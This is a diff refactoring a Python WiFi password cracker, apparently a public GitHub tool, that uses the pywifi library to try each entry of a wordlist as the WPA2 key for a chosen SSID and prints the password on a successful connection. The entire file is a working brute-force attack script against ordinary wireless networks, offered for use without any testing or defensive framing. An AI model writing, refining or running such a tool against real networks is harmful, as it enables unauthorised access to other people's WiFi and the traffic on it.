@@ -1,122 +1,105 @@
-
 import argparse
-import sys
 import os
-import os.path
 import platform
 import re
+import sys
 import time
-try:
-    import pywifi
-    from pywifi import PyWiFi
-    from pywifi import const
-    from pywifi import Profile
-except:
-    print("Installing pywifi")
 
-RED   = "\033[1;31m"  
-BLUE  = "\033[1;34m"
-CYAN  = "\033[1;36m"
+import pywifi
+from pywifi import const, Profile
+
+# Colores para la salida en consola
+RED = "\033[1;31m"
+BLUE = "\033[1;34m"
+CYAN = "\033[1;36m"
 GREEN = "\033[0;32m"
 RESET = "\033[0;0m"
-BOLD    = "\033[;1m"
+BOLD = "\033[;1m"
 REVERSE = "\033[;7m"
 
-try:
-    # wlan
-    wifi = PyWiFi()
-    ifaces = wifi.interfaces()[0]
+def check_dependencies():
+    try:
+        import pywifi
+        from pywifi import PyWiFi
+        from pywifi import const
+        from pywifi import Profile
+    except ImportError:
+        print("[-] pywifi module is not installed. Please install it.")
+        sys.exit(1)
 
-    ifaces.scan() #check the card
-    results = ifaces.scan_results()
-
-
+def initialize_wifi():
     wifi = pywifi.PyWiFi()
     iface = wifi.interfaces()[0]
-except:
-    print("[-] Error system")
+    return iface
 
-type = False
-
-def main(ssid, password, number):
-
-    profile = Profile() 
+def connect_to_network(iface, ssid, password):
+    profile = Profile()
     profile.ssid = ssid
     profile.auth = const.AUTH_ALG_OPEN
     profile.akm.append(const.AKM_TYPE_WPA2PSK)
     profile.cipher = const.CIPHER_TYPE_CCMP
-
-
     profile.key = password
+
     iface.remove_all_network_profiles()
     tmp_profile = iface.add_network_profile(profile)
-    time.sleep(0.1) # if script not working change time to 1 !!!!!!
-    iface.connect(tmp_profile) # trying to Connect
-    time.sleep(0.35) # 1s
+    time.sleep(0.1)  # Ajustado tiempo de espera
+    iface.connect(tmp_profile)
+    time.sleep(0.35)  # Ajustado tiempo de espera
 
-    if ifaces.status() == const.IFACE_CONNECTED: # checker
-        time.sleep(1)
-        print(BOLD, GREEN,'[*] Crack success!',RESET)
-        print(BOLD, GREEN,'[*] password is ' + password, RESET)
-        time.sleep(1)
-        exit()
+def check_connection_status(iface):
+    return iface.status() == const.IFACE_CONNECTED
+
+def crack_wifi(iface, ssid, wordlist):
+    with open(wordlist, 'r', encoding='utf8') as words:
+        for number, line in enumerate(words, start=1):
+            pwd = line.strip()  # Eliminar caracteres de nueva línea
+            connect_to_network(iface, ssid, pwd)
+            if check_connection_status(iface):
+                print(BOLD, GREEN, f'[*] Crack success! Password is {pwd}', RESET)
+                return
+            else:
+                print(RED, f'[{number}] Crack Failed using {pwd}')
+
+def parse_arguments():
+    parser = argparse.ArgumentParser(description='Crack WiFi using PyWiFi')
+    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID of the WiFi network')
+    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='Path to the password wordlist file')
+    parser.add_argument('-v', '--version', action='store_true', help='Display version information')
+    return parser.parse_args()
+
+def display_version_info():
+    print("\n\n", CYAN, "by Brahim Jarrar\n")
+    print(RED, " github", BLUE, " : https://github.com/BrahimJarrar/\n")
+    print(GREEN, " CopyRight 2019\n\n")
+    sys.exit(0)
+
+def clear_screen():
+    if platform.system().startswith("Win" or "win"):
+        os.system("cls")
     else:
-        print(RED, '[{}] Crack Failed using {}'.format(number, password))
+        os.system("clear")
 
-def pwd(ssid, file):
-    number = 0
-    with open(file, 'r', encoding='utf8') as words:
-        for line in words:
-            number += 1
-            line = line.split("\n")
-            pwd = line[0]
-            main(ssid, pwd, number)
-                    
+def crack_wifi_pswd_main():
+    
+    check_dependencies()
+    iface = initialize_wifi()
+    clear_screen()
+    banner()
+    print("****************************************************************")
+    args = parse_arguments()
 
+    if args.version:
+        display_version_info()
 
-def menu():
-    parser = argparse.ArgumentParser(description='argparse Example')
+    ssid = args.ssid or input("[*] SSID: ")
+    wordlist = args.wordlist or input("[*] Passwords file: ")
 
-    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
-    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')
+    if not os.path.exists(wordlist):
+        print(RED, "[-] No such file:", BLUE, wordlist)
+        sys.exit(1)
 
-    group1 = parser.add_mutually_exclusive_group()
-
-    group1.add_argument('-v', '--version', metavar='', help='version')
-    print(" ")
-
-    args = parser.parse_args()
-
-    print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
-    time.sleep(2.5)
-
-    if args.wordlist and args.ssid:
-        ssid = args.ssid
-        filee = args.wordlist
-    elif args.version:
-        print("\n\n",CYAN,"by Brahim Jarrar\n")
-        print(RED, " github", BLUE," : https://github.com/BrahimJarrar/\n")
-        print(GREEN, " CopyRight 2019\n\n")
-        exit()
-    else:
-        print(BLUE)
-        ssid = input("[*] SSID: ")
-        filee = input("[*] pwds file: : ")
-
-
-    # thx
-    if os.path.exists(filee):
-        if platform.system().startswith("Win" or "win"):
-            os.system("cls")
-        else:
-            os.system("clear")
-
-        print(BLUE,"[~] Cracking...")
-        pwd(ssid, filee)
-
-    else:
-        print(RED,"[-] No Such File.",BLUE)
-
+    print(BLUE, "[~] Cracking...")
+    crack_wifi(iface, ssid, wordlist)
 
 def banner():
     cartel = r"""
@@ -129,7 +112,4 @@ def banner():
     print(cartel)
 
 if __name__ == "__main__":
-
-    banner()
-    print("****************************************************************")
-    menu()
+    crack_wifi_pswd_main()
